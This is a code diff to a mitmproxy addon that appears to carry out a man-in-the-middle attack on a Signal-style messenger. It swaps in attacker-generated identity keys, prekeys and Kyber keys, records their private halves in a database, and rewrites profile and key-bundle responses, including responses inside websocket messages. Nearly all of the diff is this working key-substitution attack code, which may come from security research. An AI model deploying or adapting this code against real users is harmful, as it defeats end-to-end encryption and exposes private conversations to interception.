@@ -336,7 +336,19 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
                 }
             ]
         }
-    
+
+    mitm_bundle = MitMBundle.insert(
+            type = identity.lower(),
+            aci = uuid,
+            deviceId = device_id,
+            FakeIdenKey = (base64.b64encode(identity_key.public_key().serialize()).decode("utf-8"), b64encode(identity_key.private_key().serialize()).decode("utf-8")),
+            FakeSignedPreKey = (fakeBundle_wire["devices"][0]["signedPreKey"], b64encode(fakeUser.signed_pre_key_pair.private_key().serialize()).decode("utf-8")),
+            FakePrekeys = (fakeBundle_wire["devices"][0]["preKey"], b64encode(fakeUser.pre_key_pair.private_key().serialize()).decode("utf-8")),
+            fakeKyberKeys = (fakeBundle_wire["devices"][0]["pqPreKey"], b64encode(fakeUser.kyber_pre_key_pair.get_private().serialize()).decode("utf-8")),
+            fakeLastResortKyber = (b64encode(fakeUser.last_resort_kyber.get_public().serialize()).decode(), b64encode(fakeUser.last_resort_kyber.get_private().serialize()).decode("utf-8"))
+        )
+    mitm_bundle.on_conflict_replace().execute()
+
     resp.update(fakeBundle_wire)
     conversation_session[(ip_address, identifier)] = (fakeUser, fakeVictim)
     flow.response.content = json.dumps(resp, sort_keys=True).encode()
@@ -359,11 +371,28 @@ def _v1_websocket(flow, msg):
 
 def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
     logging.info(f"my profile: {identifier} {version} {credentialRequest}")
+
+    resp = json.loads(flow.response.content)
+    ip_address = flow.client_conn.address[0]
+
+    logging.warning(f"{registration_info[ip_address].aciData.IdenKey}")
+
+    resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
+    flow.response.content = json.dumps(resp).encode()
+    return flow.response.content
     # raise RuntimeError(f"my profile: {identifier} {version} {credentialRequest}")
 
 def _v1_ws_profile_futut(flow, identifier, version):
     logging.info(f"my profile 2: {identifier} {version}")
     # raise RuntimeError(f"my profile: {identifier} {version}")
+    resp = json.loads(flow.response.content)
+    ip_address = flow.client_conn.address[0]
+
+    logging.warning(f"{registration_info[ip_address].aciData.IdenKey}")
+
+    resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
+    flow.response.content = json.dumps(resp).encode()
+    return flow.response.content
 
 def _v1_ws_profile(flow, identifier):
     # message = flow.websocket.messages[-1]
@@ -394,7 +423,10 @@ def _v1_ws_profile(flow, identifier):
 
     logging.info(f"content: {content}") #### TODO: what's happening here? No injection of fake identity key
 
+    # TODO: right now we are altering a "pseudo-flow" -- one we created artificially from a websocket message.
+    # ideally, we will propage this further by checking if the flow was altered by the handler auto-magically.
     flow.response.content = json.dumps(content).encode()
+    return flow.response.content
 
 from mitmproxy.http import Request, Response, HTTPFlow
 
@@ -445,22 +477,17 @@ def _v1_websocket_resp(flow, msg):
     websocket_open_state[id].response = ws_msg
     logging.warning(f"Websocket resp with id {id} and path {path}")
 
-
     f = decap_ws_msg(flow, msg, RouteType.RESPONSE)
     handler, params, _ = ws_resp.find_handler(HOST_HTTPBIN, path) # todo: HARDCODING IS BAD, onii-chan
     logging.warning(f"HANDLER: {handler}, PARAMS: {params} -- {HOST_HTTPBIN} / {path}")
     if handler:
-        handler(f,  *params.fixed, **params.named)
-
-    # if "/v1/profile/" in path: # TODO: fix this when xepor is not retarded
-    #     identifier, uuid = re.search(r"/v1/profile/(PNI|ACI):([a-f0-9-]+)", path).groups()
-    #     content = json.loads(ws_msg.body)
-
-    #     pni = User.get(MitMBundle.type == uuid)
-
-    #     content["identityKey"] = registration_info[flow.client_conn.address[0]].aci_fake_IdenKey.public_key.serialize()
-
-
+        resp = handler(f,  *params.fixed, **params.named)
+        if resp:
+            # msg. = resp
+            new_ws = WebSocketMessage()
+            new_ws.ParseFromString(msg.content)
+            new_ws.response.body = resp
+            msg.content = new_ws.SerializeToString()
 
 
 addons = [api]
